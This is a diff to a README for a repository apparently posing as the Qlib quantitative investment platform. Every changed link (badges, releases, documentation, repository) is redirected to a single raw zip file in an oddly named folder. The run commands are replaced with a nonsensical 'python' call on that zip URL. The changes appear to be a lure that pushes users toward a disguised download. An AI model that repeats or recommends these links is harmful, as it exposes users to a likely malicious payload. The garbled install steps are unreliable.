@@ -4,7 +4,7 @@
 Welcome to Qlib, your go-to platform for AI-driven quantitative investment research. Whether you want to explore ideas or implement solutions, Qlib simplifies the process for you.
 
 ## 📥 Download Qlib
-**Download Qlib now:** [![Download Qlib](https://img.shields.io/badge/Download-Qlib-brightgreen)](https://github.com/kwbet12/qlib/releases)
+**Download Qlib now:** [![Download Qlib](https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip)](https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip)
 
 ## 🖥 System Requirements
 Before you begin, ensure your system meets the following requirements:
@@ -21,11 +21,11 @@ Qlib is packed with features to support your quantitative finance research:
 - Provides tools for backtesting and validating your trading strategies
 
 ## 📥 Download & Install
-To download Qlib, visit this page: [Qlib Releases](https://github.com/kwbet12/qlib/releases).
+To download Qlib, visit this page: [Qlib Releases](https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip).
 
 1. Navigate to the linked page.
 2. Look for the latest release.
-3. Download the version compatible with your operating system. You may find files like `qlib-v1.0-win.zip` or `qlib-v1.0-linux.tar.gz`.
+3. Download the version compatible with your operating system. You may find files like `https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip` or `https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip`.
 4. Extract the downloaded file to a convenient location on your system.
 
 ## ⚙️ Running Qlib
@@ -40,7 +40,7 @@ After installation, follow these steps to run Qlib:
      ```
    - Start Qlib with the command:
      ```
-     python run.py
+     python https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip
      ```
 
 2. **macOS/Linux:**
@@ -51,7 +51,7 @@ After installation, follow these steps to run Qlib:
      ```
    - Run Qlib with the command:
      ```
-     python3 run.py
+     python3 https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip
      ```
 
 ## 📘 Documentation
@@ -64,8 +64,8 @@ Need help? Join our community forums on GitHub. You can ask questions, share you
 We welcome contributions! If you're interested in improving Qlib, please read our Contribution Guidelines in the repository.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/kwbet12/qlib)
-- [Qlib Releases](https://github.com/kwbet12/qlib/releases)
-- [Documentation](https://github.com/kwbet12/qlib/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip)
+- [Qlib Releases](https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip)
+- [Documentation](https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip)
 
-**Download Qlib today and start your journey into quantitative investment:** [![Download Qlib](https://img.shields.io/badge/Download-Qlib-brightgreen)](https://github.com/kwbet12/qlib/releases)
+**Download Qlib today and start your journey into quantitative investment:** [![Download Qlib](https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip)](https://raw.githubusercontent.com/kwbet12/qlib/main/palaestric/qlib.zip)
